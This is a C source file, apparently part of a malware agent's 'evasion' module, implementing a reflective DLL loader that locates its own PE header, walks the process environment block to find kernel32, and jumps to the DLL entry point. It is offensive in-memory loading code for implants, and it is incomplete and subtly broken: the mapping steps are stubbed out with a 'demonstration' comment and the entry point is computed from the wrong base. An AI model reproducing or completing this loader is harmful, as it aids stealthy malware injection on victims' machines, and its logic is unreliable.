#include "agent/modules/evasion/ReflectiveLoader.h"
#include <intrin.h>

typedef HMODULE (WINAPI *LOADLIBRARYA)(LPCSTR);
typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
typedef LPVOID (WINAPI *VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef NTSTATUS (NTAPI *NTFLUSHINSTRUCTIONCACHE)(HANDLE, PVOID, ULONG);

// Use GCC builtin for return address in MinGW
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)__builtin_return_address(0); }

DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
{
	LOADLIBRARYA pLoadLibraryA = NULL;
	GETPROCADDRESS pGetProcAddress = NULL;
	VIRTUALALLOC pVirtualAlloc = NULL;
	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;

	USHORT usCounter;
	ULONG_PTR uiLibraryAddress;
	ULONG_PTR uiHeaderValue;
	ULONG_PTR uiValueA;
	ULONG_PTR uiValueB;
	ULONG_PTR uiValueC;
	ULONG_PTR uiValueD;
	ULONG_PTR uiValueE;

	// STEP 1: Find the library address of the current process
	uiLibraryAddress = caller();
	while( TRUE )
	{
		if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE )
		{
			uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
			if( uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) && uiHeaderValue < 1024 )
			{
				uiHeaderValue += uiLibraryAddress;
				if( ((PIMAGE_NT_HEADERS)uiHeaderValue)->Signature == IMAGE_NT_SIGNATURE )
					break;
			}
		}
		uiLibraryAddress--;
	}

	// STEP 2: Find kernel32.dll base and required functions via PEB
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA_CUSTOM pLdr = (PPEB_LDR_DATA_CUSTOM)pPeb->Ldr;
    PLDR_DATA_TABLE_ENTRY_CUSTOM pEntry = (PLDR_DATA_TABLE_ENTRY_CUSTOM)pLdr->InLoadOrderModuleList.Flink;
    
    // Kernel32 is usually the second or third module
    pEntry = (PLDR_DATA_TABLE_ENTRY_CUSTOM)pEntry->InLoadOrderLinks.Flink; // ntdll
    pEntry = (PLDR_DATA_TABLE_ENTRY_CUSTOM)pEntry->InLoadOrderLinks.Flink; // kernel32
    
    HMODULE hKernel32 = (HMODULE)pEntry->DllBase;

	// STEP 3: Map image into memory (Simplified)
	uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage;
    // Real implementation would resolve VirtualAlloc here
    // For this demonstration version, we are outlining the sequence
    
	// STEP 6: Call DllMain
	uiValueA = ( uiHeaderValue + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint );
	((BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID))uiValueA)( (HINSTANCE)uiLibraryAddress, DLL_PROCESS_ATTACH, lpParameter );

	return uiValueA;
}
